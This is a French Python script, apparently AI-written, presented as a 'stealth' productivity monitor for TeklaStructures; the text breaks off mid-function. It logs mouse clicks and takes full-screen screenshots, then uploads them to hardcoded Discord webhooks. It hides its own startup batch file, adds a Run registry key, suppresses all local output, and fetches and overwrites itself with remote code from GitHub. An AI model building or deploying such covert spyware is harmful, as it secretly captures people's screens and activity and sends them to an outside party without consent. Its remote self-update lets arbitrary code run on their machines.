#!/usr/bin/env python3
"""
================================================================================
                    STEALTH PRODUCTIVITY MONITOR FOR TEKLASTRUCTURES
================================================================================

Un système de monitoring de productivité discret qui surveille l'activité 
utilisateur dans TeklaStructures et envoie des rapports détaillés sur Discord.

Fonctionnalités principales:
- Comptage des clics et calcul de minutes productives
- Surveillance spécifique de programmes (TeklaStructures)
- Captures d'écran automatiques à intervalles réguliers
- Rapports de productivité détaillés sur Discord
- Système de mise à jour automatique intégré
- Mode debug configurable pour diagnostics

Auteur: Assistant IA
Version: 2.0.0
Date: 2024

================================================================================
"""

# ================================================================================
# IMPORTS ET DÉPENDANCES
# ================================================================================

import time
import datetime
import os
import tempfile
import threading
import sys
from typing import Dict, List, Optional, Any

# Dépendances externes requises - importation silencieuse
try:
    from PIL import ImageGrab
    from pynput import mouse
    import requests
    import psutil
except ImportError:
    # Sortie silencieuse si dépendances manquantes
    sys.exit(1)

# ================================================================================
# CONFIGURATION CENTRALE
# ================================================================================

class Config:
    """
    Configuration centralisée de l'application
    
    Modifiez cette classe pour personnaliser le comportement du programme.
    """
    
    # ============================================================================
    # INFORMATIONS DE VERSION ET MISE À JOUR
    # ============================================================================
    VERSION = "2.0.0"
    
    # URLs de mise à jour automatique (OBLIGATOIRE À CONFIGURER)
    UPDATE_CHECK_URL = "https://raw.githubusercontent.com/TazTheworld/Surveillance/refs/heads/main/version.txt"
    UPDATE_DOWNLOAD_URL = "https://raw.githubusercontent.com/TazTheworld/Surveillance/refs/heads/main/monitor.py"
    AUTO_UPDATE_ENABLED = True
    UPDATE_CHECK_INTERVAL_HOURS = 24
    
    # ============================================================================
    # WEBHOOKS DISCORD (OBLIGATOIRE À CONFIGURER)
    # ============================================================================
    WEBHOOKS = {
        'console': "https://discord.com/api/webhooks/1418505868588351568/TYkxLHZB8UVRA-0bnVpu6wUV_NGKjk-g51J4vf6jP0niT7h1d0_NKLYtt3ol4o2URT4P",
        'data': "https://discord.com/api/webhooks/1418505452391632976/KROQVjhd-__JPRVz6dNnzQ1Qqf0UChlE78PDINLVSS_Ij9RusrBtPDiP8S8u8NwYz90p",
        'screenshots': "https://discord.com/api/webhooks/1418505878922854420/540h-McyZKwDZvhmy7RJGLCM_GjPmcspI6DPGxIHX3E-vJdsExi0aIl2vNYpuiuqd-aa"
    }
    
    # ============================================================================
    # PARAMÈTRES DE MONITORING
    # ============================================================================
    SCREENSHOT_INTERVAL = 600  # Intervalle entre captures (secondes)
    TARGET_PROGRAMS = ["TeklaStructures.exe"]  # Programmes à surveiller
    MIN_CLICKS_PER_MINUTE = 2  # Seuil de productivité (clics/minute)
    DEBUG_MODE = False  # Mode debug (True = verbeux, False = silencieux)
    
    # ============================================================================
    # PARAMÈTRES TECHNIQUES
    # ============================================================================
    MAX_ACTIVITY_LOG_SIZE = 200  # Nombre max de clics en mémoire
    DATA_RETENTION_HOURS = 24  # Durée de rétention des données (heures)
    PROGRAM_CHECK_INTERVAL = 10  # Intervalle vérification programme (secondes)
    WEBHOOK_TIMEOUT = 10  # Timeout requêtes Discord (secondes)

# ================================================================================
# UTILITAIRES ET HELPERS
# ================================================================================

class TimeUtils:
    """Utilitaires de gestion du temps et des dates"""
    
    @staticmethod
    def now() -> datetime.datetime:
        """Obtenir l'heure actuelle"""
        return datetime.datetime.now()
    
    @staticmethod
    def format(dt: datetime.datetime, format_str: str = "%H:%M") -> str:
        """Formater une date/heure"""
        return dt.strftime(format_str)
    
    @staticmethod
    def minute_key(dt: datetime.datetime) -> str:
        """Générer une clé minute unique (YYYY-MM-DD HH:MM)"""
        return dt.strftime("%Y-%m-%d %H:%M")
    
    @staticmethod
    def previous_minute(dt: datetime.datetime) -> datetime.datetime:
        """Obtenir la minute précédente complète"""
        return dt.replace(second=0, microsecond=0) - datetime.timedelta(minutes=1)

class DiscordManager:
    """Gestionnaire des communications Discord via webhooks"""
    
    def __init__(self, webhooks: Dict[str, str]):
        self.webhooks = webhooks
        self.timeout = Config.WEBHOOK_TIMEOUT
    
    def send(self, webhook_type: str, message: str = None, filepath: str = None) -> bool:
        """
        Envoyer un message/fichier vers Discord
        
        Args:
            webhook_type: Type de webhook ('console', 'data', 'screenshots')
            message: Message texte à envoyer
            filepath: Chemin fichier à envoyer (sera supprimé après envoi)
            
        Returns:
            bool: True si envoi réussi
        """
        webhook_url = self.webhooks.get(webhook_type)
        if not webhook_url:
            return False
        
        try:
            # Préparer les données
            data = {'content': message} if message else {}
            files = {}
            
            if filepath and os.path.exists(filepath):
                files['file'] = open(filepath, 'rb')
            
            # Envoyer la requête
            response = requests.post(webhook_url, data=data, files=files, timeout=self.timeout)
            success = response.status_code == 204
            
            # Nettoyer les ressources
            if files:
                files['file'].close()
            
            if filepath and os.path.exists(filepath):
                os.remove(filepath)
            
            return success
            
        except Exception:
            # Nettoyer en cas d'erreur
            if filepath and os.path.exists(filepath):
                try:
                    os.remove(filepath)
                except:
                    pass
            return False

# ================================================================================
# SYSTÈME DE MISE À JOUR AUTOMATIQUE
# ================================================================================

class AutoUpdater:
    """Système de mise à jour automatique intégré"""
    
    def __init__(self, discord_manager: DiscordManager):
        self.discord = discord_manager
        self.current_version = Config.VERSION
        self.check_url = Config.UPDATE_CHECK_URL
        self.download_url = Config.UPDATE_DOWNLOAD_URL
        self.backup_file = "monitor_backup.py"
    
    def send_message(self, message: str):
        """Envoyer un message de mise à jour sur Discord"""
        self.discord.send('console', message)
    
    def check_updates(self) -> bool:
        """Vérifier si une mise à jour est disponible"""
        try:
            response = requests.get(self.check_url, timeout=10)
            if response.status_code != 200:
                return False
            
            remote_version = response.text.strip()
            self.send_message(f"🔍 Version actuelle: {self.current_version} | Distante: {remote_version}")
            
            return self._is_newer_version(remote_version, self.current_version)
            
        except Exception as e:
            self.send_message(f"❌ Erreur vérification version: {e}")
            return False
    
    def _is_newer_version(self, remote: str, current: str) -> bool:
        """Comparer deux versions (format X.Y.Z)"""
        try:
            def version_tuple(version):
                return tuple(map(int, version.split('.')))
            
            return version_tuple(remote) > version_tuple(current)
        except:
            return False
    
    def download_and_install(self) -> bool:
        """Télécharger et installer la mise à jour"""
        try:
            # Sauvegarder l'ancienne version
            current_file = os.path.abspath(__file__)
            self._create_backup(current_file)
            
            # Télécharger la nouvelle version
            self.send_message("🔄 Téléchargement de la mise à jour...")
            response = requests.get(self.download_url, timeout=30)
            
            if response.status_code != 200:
                raise Exception(f"Erreur HTTP {response.status_code}")
            
            # Installer la nouvelle version
            with open(current_file, 'w', encoding='utf-8') as f:
                f.write(response.text)
            
            self.send_message("✅ Mise à jour installée avec succès")
            return True
            
        except Exception as e:
            self.send_message(f"❌ Erreur installation: {e}")
            self._restore_backup()
            return False
    
    def _create_backup(self, source_file: str):
        """Créer une sauvegarde de l'ancien fichier"""
        try:
            import shutil
            shutil.copy2(source_file, self.backup_file)
            self.send_message("💾 Sauvegarde créée")
        except Exception as e:
            self.send_message(f"⚠️ Erreur sauvegarde: {e}")
    
    def _restore_backup(self):
        """Restaurer la sauvegarde en cas d'erreur"""
        try:
            if os.path.exists(self.backup_file):
                import shutil
                current_file = os.path.abspath(__file__)
                shutil.copy2(self.backup_file, current_file)
                self.send_message("🔄 Version précédente restaurée")
        except Exception as e:
            self.send_message(f"⚠️ Erreur restauration: {e}")
    
    def schedule_restart(self):
        """Programmer un redémarrage pour appliquer la mise à jour"""
        try:
            import subprocess
            
            # Script de redémarrage automatique
            restart_script = f'''
import time
import subprocess
import sys
import os

time.sleep(3)
try:
    subprocess.Popen([sys.executable, "{os.path.abspath(__file__)}"])
finally:
    try:
        os.remove(__file__)
    except:
        pass
'''
            
            # Créer et lancer le script de redémarrage
            with open("restart_monitor.py", 'w') as f:
                f.write(restart_script)
            
            subprocess.Popen([sys.executable, "restart_monitor.py"])
            self.send_message("🔄 Redémarrage programmé")
            
            return True
            
        except Exception as e:
            self.send_message(f"❌ Erreur redémarrage: {e}")
            return False
    
    def update_if_available(self) -> bool:
        """Vérifier et installer une mise à jour si disponible"""
        if not self.check_updates():
            return False
        
        self.send_message("🔄 Installation de la mise à jour...")
        
        if self.download_and_install():
            self.send_message("🎉 Mise à jour terminée - Redémarrage dans 30 secondes")
            return True
        
        return False

# ================================================================================
# SURVEILLANCE DES PROGRAMMES
# ================================================================================

class ProgramMonitor:
    """Surveillance de l'état des programmes cibles"""
    
    def __init__(self, target_programs: List[str], discord_manager: DiscordManager):
        self.target_programs = target_programs
        self.discord = discord_manager
        self.program_detected = False
    
    def is_running(self) -> bool:
        """Vérifier si un programme cible est en cours d'exécution"""
        if not self.target_programs:
            return True
        
        try:
            running_processes = self._get_running_processes()
            
            for target in self.target_programs:
                if self._is_process_running(target.lower(), running_processes):
                    self._notify_detection_once(target)
                    return True
            
            return False
            
        except Exception:
            return True  # En cas d'erreur, considérer comme actif
    
    def _get_running_processes(self) -> List[str]:
        """Obtenir la liste des processus en cours"""
        processes = []
        for process in psutil.process_iter(['name']):
            try:
                processes.append(process.info['name'].lower())
            except:
                continue
        return processes
    
    def _is_process_running(self, target: str, processes: List[str]) -> bool:
        """Vérifier si un processus spécifique est actif"""
        for process in processes:
            if target in process or process in target:
                return True
        return False
    
    def _notify_detection_once(self, program_name: str):
        """Notifier la détection du programme (une seule fois)"""
        if not self.program_detected:
            self.discord.send('console', f"✅ Programme détecté: {program_name}")
            self.program_detected = True

# ================================================================================
# ANALYSE DE PRODUCTIVITÉ
# ================================================================================

class ProductivityAnalyzer:
    """Analyseur de productivité basé sur l'activité utilisateur"""
    
    def __init__(self, min_clicks_per_minute: int, discord_manager: DiscordManager):
        self.min_clicks_threshold = min_clicks_per_minute
        self.discord = discord_manager
        
        # Stockage des données de productivité
        self.productive_minutes: Dict[str, int] = {}
        self.hourly_stats: Dict[int, int] = {}
        self.last_analyzed_minute = ""
    
    def analyze_minute(self, minute_key: str, click_count: int) -> bool:
        """
        Analyser la productivité d'une minute spécifique
        
        Args:
            minute_key: Clé de minute (YYYY-MM-DD HH:MM)
            click_count: Nombre de clics dans cette minute
            
        Returns:
            bool: True si la minute est considérée productive
        """
        # Éviter l'analyse multiple de la même minute
        if minute_key == self.last_analyzed_minute:
            return False
        
        self.last_analyzed_minute = minute_key
        
        # Déterminer si la minute est productive
        is_productive = click_count >= self.min_clicks_threshold
        
        if Config.DEBUG_MODE:
            status = "✅ PRODUCTIVE" if is_productive else "❌ Non productive"
            self.discord.send('console', f"🐛 DEBUG: {minute_key} - {click_count} clics - {status}")
        
        # Enregistrer si productive
        if is_productive:
            self.productive_minutes[minute_key] = click_count
            self._update_hourly_stats(minute_key)
            
            # Notification seulement en mode debug
            if Config.DEBUG_MODE:
                minute_display = minute_key.split(' ')[1]  # Extraire HH:MM
                self.discord.send('console', f"✅ MINUTE PRODUCTIVE: {minute_display} ({click_count} clics)")
        
        return is_productive
    
    def _update_hourly_stats(self, minute_key: str):
        """Mettre à jour les statistiques horaires"""
        try:
            hour = int(minute_key.split(' ')[1].split(':')[0])
            self.hourly_stats[hour] = self.hourly_stats.get(hour, 0) + 1
        except:
            pass
    
    def cleanup_old_data(self):
        """Nettoyer les données anciennes (> 24h)"""
        cutoff_time = TimeUtils.now() - datetime.timedelta(hours=Config.DATA_RETENTION_HOURS)
        cutoff_key = TimeUtils.minute_key(cutoff_time)
        
        old_keys = [k for k in self.productive_minutes.keys() if k < cutoff_key]
        for key in old_keys:
            del self.productive_minutes[key]
    
    def get_report(self) -> Dict[str, Any]:
        """Générer un rapport de productivité complet"""
        now = TimeUtils.now()
        current_hour = now.hour
        
        current_hour_minutes = self.hourly_stats.get(current_hour, 0)
        total_productive_minutes = sum(self.hourly_stats.values())
        
        # Calculer la moyenne des 3 dernières heures
        recent_hours_data = []
        for i in range(1, 4):
            hour = (current_hour - i) % 24
            if hour in self.hourly_stats:
                recent_hours_data.append(self.hourly_stats[hour])
        
        avg_recent = sum(recent_hours_data) / len(recent_hours_data) if recent_hours_data else 0
        productivity_percentage = round((current_hour_minutes / 60) * 100, 1) if current_hour_minutes > 0 else 0
        
        return {
            "current_hour": current_hour,
            "current_hour_minutes": current_hour_minutes,
            "productivity_percentage": productivity_percentage,
            "avg_last_3_hours": round(avg_recent, 1),
            "total_today": total_productive_minutes,
            "hourly_breakdown": dict(sorted(self.hourly_stats.items()))
        }

# ================================================================================
# GESTIONNAIRE D'ACTIVITÉ UTILISATEUR
# ================================================================================

class ActivityTracker:
    """Gestionnaire de l'activité utilisateur (clics, mouvements, etc.)"""
    
    def __init__(self, max_log_size: int = Config.MAX_ACTIVITY_LOG_SIZE):
        self.click_count = 0
        self.activity_log: List[Dict[str, Any]] = []
        self.max_log_size = max_log_size
        self.session_start = TimeUtils.now().isoformat()
    
    def record_click(self, x: int, y: int, button: str) -> Dict[str, Any]:
        """Enregistrer un clic utilisateur"""
        self.click_count += 1
        timestamp = TimeUtils.now().isoformat()
        
        click_data = {
            "timestamp": timestamp,
            "click_number": self.click_count,
            "position": {"x": x, "y": y},
            "button": str(button)
        }
        
        self.activity_log.append(click_data)
        
        # Maintenir la taille du log
        if len(self.activity_log) > self.max_log_size:
            self.activity_log.pop(0)
        
        return click_data
    
    def get_clicks_in_period(self, start_time: datetime.datetime, end_time: datetime.datetime) -> List[Dict[str, Any]]:
        """Obtenir les clics dans une période donnée"""
        clicks = []
        for click in self.activity_log:
            try:
                click_time = datetime.datetime.fromisoformat(click["timestamp"])
                if start_time <= click_time < end_time:
                    clicks.append(click)
            except:
                continue
        return clicks
    
    def get_session_duration_hours(self) -> float:
        """Obtenir la durée de session en heures"""
        try:
            start = datetime.datetime.fromisoformat(self.session_start)
            duration = TimeUtils.now() - start
            return duration.total_seconds() / 3600
        except:
            return 0.0

# ================================================================================
# SYSTÈME DE CAPTURES D'ÉCRAN
# ================================================================================

class ScreenshotManager:
    """Gestionnaire des captures d'écran automatiques"""
    
    @staticmethod
    def capture() -> Optional[str]:
        """
        Prendre une capture d'écran et retourner le chemin du fichier temporaire
        
        Returns:
            str: Chemin du fichier temporaire ou None si échec
        """
        try:
            # Créer fichier temporaire
            with tempfile.NamedTemporaryFile(suffix='.png', delete=False) as temp_file:
                temp_path = temp_file.name
            
            # Capturer l'écran
            screenshot = ImageGrab.grab()
            screenshot.save(temp_path)
            
            return temp_path
            
        except Exception:
            return None

# ================================================================================
# GÉNÉRATEUR DE RAPPORTS DISCORD
# ================================================================================

class ReportGenerator:
    """Générateur de rapports formatés pour Discord"""
    
    @staticmethod
    def productivity_report(
        report_data: Dict[str, Any],
        total_clicks: int,
        session_duration: float,
        threshold: int
    ) -> str:
        """Générer un rapport de productivité détaillé"""
        
        now = TimeUtils.now()
        
        # En-tête principal
        text = f"""**📊 Rapport Productivité - {TimeUtils.format(now, '%H:%M')}**

🕐 **Heure actuelle ({report_data['current_hour']}h):**
├ Minutes productives: {report_data['current_hour_minutes']}/60
├ Pourcentage: {report_data['productivity_percentage']}%

📈 **Statistiques session:**
├ Durée: {session_duration:.1f}h
├ Moyenne 3 dernières heures: {report_data['avg_last_3_hours']} min/h
├ Total aujourd'hui: {report_data['total_today']} minutes productives
├ Total clics: {total_clicks}

⚙️ **Configuration:**
├ Seuil: {threshold} clics/minute minimum
├ Programme: TeklaStructures
└ Version: {Config.VERSION}"""

        # Section debug si activée
        if Config.DEBUG_MODE:
            text += f"""

🐛 **Debug Info:**
├ Log size: {len(report_data.get('activity_log', []))} entrées
└ Mode: Debug activé"""

        # Graphique horaire
        text += "\n\n**📈 Activité horaire (8 dernières heures):**"
        
        hourly_data = report_data.get('hourly_breakdown', {})
        if hourly_data:
            # Prendre les 8 dernières heures
            recent_hours = sorted(hourly_data.keys())[-8:]
            for hour in recent_hours:
                minutes = hourly_data[hour]
                percentage = round((minutes / 60) * 100, 1)
                
                # Barre de progression ASCII
                bar_length = min(int(percentage / 5), 20)
                bar = "█" * bar_length + "░" * (20 - bar_length)
                
                text += f"\n{hour:02d}h: {minutes:02d}/60 min ({percentage:4.1f}%) {bar}"
        else:
            text += "\n(Aucune donnée disponible)"
        
        return text
    
    @staticmethod
    def activity_summary(
        session_duration: float,
        total_clicks: int,
        productivity_data: Dict[str, Any],
        is_monitoring: bool
    ) -> str:
        """Générer un résumé d'activité pour les captures"""
        status_icon = "✅" if is_monitoring else "❌"
        
        return (
            f"Session: {session_duration:.1f}h | "
            f"Clics: {total_clicks} | "
            f"Heure: {productivity_data.get('current_hour_minutes', 0)}/60 min "
            f"({productivity_data.get('productivity_percentage', 0)}%) | "
            f"Total: {productivity_data.get('total_today', 0)} min | "
            f"Status: {status_icon}"
        )

# ================================================================================
# SYSTÈME D'INSTALLATION
# ================================================================================

class SystemInstaller:
    """Gestionnaire d'installation au démarrage système"""
    
    @staticmethod
    def install_startup() -> bool:
        """Installer le programme au démarrage automatique Windows"""
        try:
            import winreg
            from pathlib import Path
            
            current_file = os.path.abspath(__file__)
            
            # Installation via dossier de démarrage
            startup_folder = Path.home() / "AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
            bat_file = startup_folder / "tekla_monitor.bat"
            
            # Créer le fichier batch
            bat_content = f'@echo off\nstart /min /b "" "python" "{current_file}"'
            with open(bat_file, 'w') as f:
                f.write(bat_content)
            
            # Masquer le fichier
            if os.name == 'nt':
                os.system(f'attrib +h "{bat_file}"')
            
            # Installation via registre (méthode de sauvegarde)
            try:
                key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
                key_name = "TeklaProductivityMonitor"
                command = f'python "{current_file}"'
                
                with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
                    winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, command)
            except:
                pass  # Ignorer les erreurs de registre
            
            return True
            
        except Exception:
            return False

# ================================================================================
# MONITOR PRINCIPAL
# ================================================================================

class TeklaProductivityMonitor:
    """
    Classe principale du système de monitoring de productivité
    
    Orchestre tous les composants pour surveiller l'activité utilisateur,
    analyser la productivité et envoyer des rapports automatiques sur Discord.
    """
    
    def __init__(self):
        """Initialiser tous les composants du système"""
        
        # Gestionnaires principaux
        self.discord = DiscordManager(Config.WEBHOOKS)
        self.auto_updater = AutoUpdater(self.discord)
        self.program_monitor = ProgramMonitor(Config.TARGET_PROGRAMS, self.discord)
        self.productivity_analyzer = ProductivityAnalyzer(Config.MIN_CLICKS_PER_MINUTE, self.discord)
        self.activity_tracker = ActivityTracker()
        self.screenshot_manager = ScreenshotManager()
        
        # État du système
        self.running = False
        self.monitoring_active = False
        self.last_update_check = 0
        
        # Threads de travail
        self.threads: List[threading.Thread] = []
        self.mouse_listener: Optional[mouse.Listener] = None
    
    # ============================================================================
    # MÉTHODES DE COMMUNICATION
    # ============================================================================
    
    def send_console(self, message: str):
        """Envoyer un message sur le canal console Discord"""
        self.discord.send('console', f"🖥️ {message}")
    
    def send_data(self, message: str):
        """Envoyer un rapport sur le canal data Discord"""
        self.discord.send('data', f"📊 {message}")
    
    def send_screenshot(self, filepath: str, caption: str):
        """Envoyer une capture d'écran sur Discord"""
        self.discord.send('screenshots', f"📸 {caption}", filepath)
    
    def debug_log(self, message: str):
        """Envoyer un message de debug (seulement si mode debug activé)"""
        if Config.DEBUG_MODE:
            self.send_console(f"🐛 DEBUG: {message}")
    
    # ============================================================================
    # GESTIONNAIRES D'ÉVÉNEMENTS
    # ============================================================================
    
    def handle_mouse_click(self, x: int, y: int, button, pressed: bool):
        """Gestionnaire des événements de clic souris"""
        if not pressed or not self.monitoring_active:
            return
        
        # Enregistrer le clic
        self.activity_tracker.record_click(x, y, str(button))
        
        # Debug périodique
        if Config.DEBUG_MODE and self.activity_tracker.click_count % 50 == 0:
            self.debug_log(f"📊 {self.activity_tracker.click_count} clics total")
    
    def check_program_status(self):
        """Vérifier et mettre à jour le statut de surveillance"""
        was_active = self.monitoring_active
        self.monitoring_active = self.program_monitor.is_running()
        
        # Notifier les changements d'état
        if self.monitoring_active != was_active:
            if self.monitoring_active:
                self.send_console("🟢 Surveillance TeklaStructures ACTIVÉE")
            else:
                self.send_console("🔴 TeklaStructures fermé - Surveillance EN PAUSE")
    
    # ============================================================================
    # ANALYSE ET RAPPORTS
    # ============================================================================
    
    def analyze_previous_minute(self):
        """Analyser la minute qui vient de se terminer"""
        now = TimeUtils.now()
        previous_minute = TimeUtils.previous_minute(now)
        minute_key = TimeUtils.minute_key(previous_minute)
        
        # Compter les clics de cette minute
        end_time = previous_minute + datetime.timedelta(minutes=1)
        clicks = self.activity_tracker.get_clicks_in_period(previous_minute, end_time)
        
        # Analyser la productivité
        self.productivity_analyzer.analyze_minute(minute_key, len(clicks))
        
        # Nettoyer les anciennes données
        self.productivity_analyzer.cleanup_old_data()
    
    def generate_productivity_report(self):
        """Générer et envoyer le rapport de productivité horaire"""
        try:
            # Collecter les données
            productivity_data = self.productivity_analyzer.get_report()
            session_duration = self.activity_tracker.get_session_duration_hours()
            
            # Générer le rapport
            report = ReportGenerator.productivity_report(
                productivity_data,
                self.activity_tracker.click_count,
                session_duration,
                Config.MIN_CLICKS_PER_MINUTE
            )
            
            # Envoyer sur Discord
            self.send_data(report)
            
            if Config.DEBUG_MODE:
                self.debug_log(f"📊 Rapport envoyé - {productivity_data['total_today']} min productives")
                
        except Exception as e:
            error_msg = f"❌ Erreur génération rapport: {e}" if Config.DEBUG_MODE else "❌ Erreur rapport de productivité"
            self.send_console(error_msg)
    
    def take_and_send_screenshot(self):
        """Prendre et envoyer une capture d'écran"""
        try:
            # Capturer l'écran
            temp_path = self.screenshot_manager.capture()
            if not temp_path:
                raise Exception("Échec de la capture")
            
            # Générer le résumé d'activité
            productivity_data = self.productivity_analyzer.get_report()
            session_duration = self.activity_tracker.get_session_duration_hours()
            
            summary = ReportGenerator.activity_summary(
                session_duration,
                self.activity_tracker.click_count,
                productivity_data,
                self.monitoring_active
            )
            
            # Envoyer sur Discord
            self.send_screenshot(temp_path, summary)
            
        except Exception as e:
            error_msg = f"❌ Erreur capture: {e}" if Config.DEBUG_MODE else "❌ Erreur capture d'écran"
            self.send_console(error_msg)
    
    # ============================================================================
    # THREADS DE TRAVAIL
    # ============================================================================
    
    def productivity_worker(self):
        """Thread d'analyse de productivité (s'exécute chaque minute)"""
        check_interval = 15 if Config.DEBUG_MODE else 30
        
        while self.running:
            time.sleep(check_interval)
            if not self.running:
                break
            
            try:
                now = TimeUtils.now()
                
                # Analyser la minute précédente au changement de minute
                if now.second < check_interval:
                    self.analyze_previous_minute()
                
                # Rapport horaire à chaque heure pleine
                if now.minute == 0 and now.second < check_interval:
                    self.generate_productivity_report()
                
                # Heartbeat de debug
                if Config.DEBUG_MODE and now.minute % 5 == 0 and now.second < check_interval:
                    self.debug_log(f"💓 Heartbeat - Clics: {self.activity_tracker.click_count}, Actif: {self.monitoring_active}")
                    
            except Exception as e:
                if Config.DEBUG_MODE:
                    self.debug_log(f"❌ Erreur thread productivité: {e}")
    
    def program_checker_worker(self):
        """Thread de vérification des programmes cibles"""
        while self.running:
            try:
                self.check_program_status()
            except Exception as e:
                if Config.DEBUG_MODE:
                    self.debug_log(f"❌ Erreur vérification programme: {e}")
            
            time.sleep(Config.PROGRAM_CHECK_INTERVAL)
    
    def screenshot_worker(self):
        """Thread de captures d'écran automatiques"""
        while self.running:
            if self.monitoring_active:
                try:
                    self.take_and_send_screenshot()
                except Exception as e:
                    if Config.DEBUG_MODE:
                        self.debug_log(f"❌ Erreur thread screenshot: {e}")
            
            time.sleep(Config.SCREENSHOT_INTERVAL)
    
    def update_checker_worker(self):
        """Thread de vérification des mises à jour automatiques"""
        while self.running:
            try:
                current_time = time.time()
                
                # Vérifier toutes les X heures
                if (current_time - self.last_update_check) >= (Config.UPDATE_CHECK_INTERVAL_HOURS * 3600):
                    self.last_update_check = current_time
                    
                    if Config.DEBUG_MODE:
                        self.debug_log("🔍 Vérification automatique des mises à jour")
                    
                    if self.auto_updater.update_if_available():
                        # Programmer le redémarrage après 30 secondes
                        threading.Timer(30.0, self._restart_for_update).start()
                        break
                
                time.sleep(3600)  # Vérifier toutes les heures
                
            except Exception as e:
                if Config.DEBUG_MODE:
                    self.debug_log(f"❌ Erreur vérification mise à jour: {e}")
                time.sleep(3600)
    
    def _restart_for_update(self):
        """Redémarrer pour appliquer une mise à jour"""
        try:
            self.send_console("🔄 Application de la mise à jour - Redémarrage...")
            self.auto_updater.schedule_restart()
            self.running = False
        except Exception as e:
            error_msg = f"❌ Erreur redémarrage: {e}" if Config.DEBUG_MODE else "❌ Erreur redémarrage"
            self.send_console(error_msg)
    
    # ============================================================================
    # CONTRÔLE PRINCIPAL DU SYSTÈME
    # ============================================================================
    
    def start(self) -> bool:
        """Démarrer le système de monitoring"""
        
        # Vérification de la configuration
        if not self._validate_configuration():
            return False
        
        self.running = True
        
        # Message de démarrage
        version_info = f" v{Config.VERSION}"
        debug_info = " (DEBUG)" if Config.DEBUG_MODE else ""
        start_message = f"🚀 DÉMARRAGE TeklaStructures Monitor{version_info}{debug_info} - {TimeUtils.format(TimeUtils.now())}"
        self.send_console(start_message)
        
        # Vérification silencieuse des mises à jour au démarrage
        if Config.DEBUG_MODE:
            self.debug_log("🔍 Vérification des mises à jour au démarrage")
        
        try:
            if self.auto_updater.check_updates():
                self.send_console("🔄 Mise à jour disponible détectée")
        except:
            pass  # Ignorer les erreurs de mise à jour au démarrage
        
        try:
            # Vérification initiale du programme
            self.check_program_status()
            
            # Démarrer le listener de souris
            self.mouse_listener = mouse.Listener(on_click=self.handle_mouse_click)
            self.mouse_listener.start()
            if Config.DEBUG_MODE:
                self.debug_log("👆 Listener souris démarré")
            
            # Démarrer tous les threads de travail
            self._start_worker_threads()
            
            if Config.DEBUG_MODE:
                self.debug_log("✅ Tous les systèmes opérationnels")
            
            # Boucle principale
            while self.running:
                time.sleep(1)
                
        except KeyboardInterrupt:
            self._shutdown()
        except Exception as e:
            error_msg = f"❌ Erreur système: {e}" if Config.DEBUG_MODE else "❌ Erreur système critique"
            self.send_console(error_msg)
            return False
        
        return True
    
    def _validate_configuration(self) -> bool:
        """Valider la configuration avant démarrage"""
        required_webhooks = ['console', 'data', 'screenshots']
        missing = [w for w in required_webhooks if not Config.WEBHOOKS.get(w)]
        
        if missing:
            self.send_console(f"❌ ERREUR: Webhooks manquants: {', '.join(missing)}")
            return False
        
        return True
    
    def _start_worker_threads(self):
        """Démarrer tous les threads de travail"""
        thread_configs = [
            ("ProgramChecker", self.program_checker_worker),
            ("ProductivityAnalyzer", self.productivity_worker),
            ("ScreenshotWorker", self.screenshot_worker),
            ("UpdateChecker", self.update_checker_worker)
        ]
        
        for name, target in thread_configs:
            thread = threading.Thread(target=target, name=name)
            thread.daemon = True
            thread.start()
            self.threads.append(thread)
            
            if Config.DEBUG_MODE:
                self.debug_log(f"🔧 Thread {name} démarré")
    
    def _shutdown(self):
        """Arrêter proprement le système"""
        self.running = False
        
        try:
            # Arrêter le listener souris
            if self.mouse_listener:
                self.mouse_listener.stop()
                if Config.DEBUG_MODE:
                    self.debug_log("👆 Listener souris arrêté")
            
            # Attendre la fin des threads
            for thread in self.threads:
                if thread.is_alive():
                    thread.join(timeout=2.0)
            
            # Rapport final
            productivity_data = self.productivity_analyzer.get_report()
            session_duration = self.activity_tracker.get_session_duration_hours()
            
            final_message = (
                f"🛑 Session terminée {TimeUtils.format(TimeUtils.now())} - "
                f"{self.activity_tracker.click_count} clics total, "
                f"{productivity_data['total_today']} minutes productives, "
                f"durée: {session_duration:.1f}h"
            )
            
            self.send_console(final_message)
            
        except Exception as e:
            error_msg = f"⚠️ Erreur arrêt: {e}" if Config.DEBUG_MODE else "⚠️ Erreur lors de l'arrêt"
            self.send_console(error_msg)

# ================================================================================
# FONCTIONS UTILITAIRES
# ================================================================================

def check_dependencies() -> bool:
    """Vérifier que toutes les dépendances sont installées"""
    required_modules = ['PIL', 'pynput', 'requests', 'psutil']
    missing_modules = []
    
    for module in required_modules:
        try:
            __import__(module)
        except ImportError:
            missing_modules.append(module)
    
    if missing_modules:
        # Envoyer sur Discord uniquement - pas de console
        try:
            monitor = TeklaProductivityMonitor()
            monitor.send_console(f"❌ Modules manquants: {', '.join(missing_modules)}")
            monitor.send_console("📦 Installez avec: pip install pillow pynput requests psutil")
        except:
            pass
        return False
    
    return True

def install_to_startup() -> int:
    """Installer le programme au démarrage automatique"""
    try:
        monitor = TeklaProductivityMonitor()
        monitor.send_console("🔧 Installation au démarrage automatique...")
        
        success = SystemInstaller.install_startup()
        
        if success:
            monitor.send_console("✅ Installation au démarrage réussie!")
            monitor.send_console("🔄 Le programme se lancera automatiquement au prochain redémarrage")
        else:
            monitor.send_console("❌ Échec de l'installation au démarrage")
        
        return 0 if success else 1
        
    except Exception:
        return 1

# ================================================================================
# POINT D'ENTRÉE PRINCIPAL
# ================================================================================

def main() -> int:
    """
    Point d'entrée principal du programme
    
    Returns:
        int: Code de sortie (0 = succès, 1 = erreur)
    """
    try:
        # Vérifier les dépendances
        if not check_dependencies():
            return 1
        
        # Créer et démarrer le monitor
        monitor = TeklaProductivityMonitor()
        success = monitor.start()
        
        return 0 if success else 1
        
    except KeyboardInterrupt:
        return 0
    except Exception as e:
        # Tentative d'envoi d'erreur sur Discord
        try:
            monitor = TeklaProductivityMonitor()
            monitor.send_console(f"❌ Erreur fatale: {e}")
        except:
            pass
        return 1

def show_help():
    """Fonction d'aide supprimée pour mode stealth complet"""
    # Envoi des informations d'aide sur Discord au lieu de la console
    try:
        monitor = TeklaProductivityMonitor()
        help_message = f"""**📋 TEKLA PRODUCTIVITY MONITOR v{Config.VERSION}**

**🎯 Fonctionnalités:**
✅ Surveillance automatique TeklaStructures
✅ Comptage clics et productivité  
✅ Captures d'écran automatiques
✅ Rapports Discord temps réel
